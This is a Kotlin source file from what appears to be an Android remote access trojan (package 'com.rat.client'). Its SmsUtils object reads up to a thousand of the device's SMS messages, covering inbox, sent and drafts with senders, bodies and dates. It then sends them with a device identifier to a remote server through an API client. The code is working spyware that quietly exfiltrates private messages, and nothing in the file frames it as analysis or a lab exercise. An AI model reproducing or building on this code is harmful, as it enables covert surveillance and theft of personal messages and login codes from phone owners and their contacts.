package com.rat.client.utils

import android.Manifest
import android.content.Context
import android.database.Cursor
import android.net.Uri
import android.util.Log
import com.rat.client.Config
import org.json.JSONArray
import org.json.JSONObject

/**
 * Reads SMS messages from the device.
 */
object SmsUtils {
    private const val TAG = "SmsUtils"

    fun getAllSms(context: Context) {
        if (!PermissionManager.hasPermissions(context, arrayOf(Manifest.permission.READ_SMS))) {
            Log.w(TAG, "SMS permission not granted")
            return
        }

        try {
            val messages = JSONArray()
            val uri = Uri.parse("content://sms")

            var cursor: Cursor? = null
            try {
                cursor = context.contentResolver.query(
                    uri,
                    null,
                    null,
                    null,
                    "date DESC LIMIT 1000"
                )

                if (cursor != null && cursor.moveToFirst()) {
                    val typeIdx = cursor.getColumnIndex("type")
                    val addressIdx = cursor.getColumnIndex("address")
                    val bodyIdx = cursor.getColumnIndex("body")
                    val dateIdx = cursor.getColumnIndex("date")
                    val readIdx = cursor.getColumnIndex("read")
                    val serviceCenterIdx = cursor.getColumnIndex("service_center")

                    do {
                        val msg = JSONObject()
                        val type = if (typeIdx >= 0) cursor.getInt(typeIdx) else 0
                        msg.put("type", when (type) {
                            1 -> "inbox"
                            2 -> "sent"
                            3 -> "draft"
                            4 -> "outbox"
                            else -> "inbox"
                        })
                        msg.put("address", if (addressIdx >= 0) cursor.getString(addressIdx) ?: "" else "")
                        msg.put("body", if (bodyIdx >= 0) cursor.getString(bodyIdx) ?: "" else "")
                        msg.put("date", if (dateIdx >= 0) cursor.getLong(dateIdx) else 0L)
                        msg.put("read", if (readIdx >= 0) cursor.getInt(readIdx) == 1 else false)
                        msg.put("serviceCenter", if (serviceCenterIdx >= 0) cursor.getString(serviceCenterIdx) ?: "" else "")

                        messages.put(msg)
                    } while (cursor.moveToNext())
                }
            } finally {
                cursor?.close()
            }

            if (messages.length() > 0) {
                val payload = JSONObject()
                payload.put("deviceId", DeviceInfoUtils.getDeviceId(context))
                payload.put("messages", messages)

                val response = ApiClient.post(Config.Api.SMS, payload)
                Log.d(TAG, "Sent ${messages.length()} SMS messages")
            }
        } catch (e: Exception) {
            Log.e(TAG, "SMS error: ${e.message}")
        }
    }
}

